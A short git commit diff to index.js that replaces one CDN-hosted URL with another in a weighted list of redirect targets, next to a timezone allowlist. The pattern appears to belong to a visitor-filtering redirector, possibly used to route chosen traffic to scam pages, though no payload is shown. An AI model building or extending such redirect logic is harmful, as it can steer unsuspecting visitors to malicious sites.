7d57a1a4350303cb2a9f443f04175948ac4d242d
paalakash <palaksh452@gmail.com>
2026-06-30 12:06:23 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://nearesttt.b-cdn.net/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://stojarjee.b-cdn.net/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
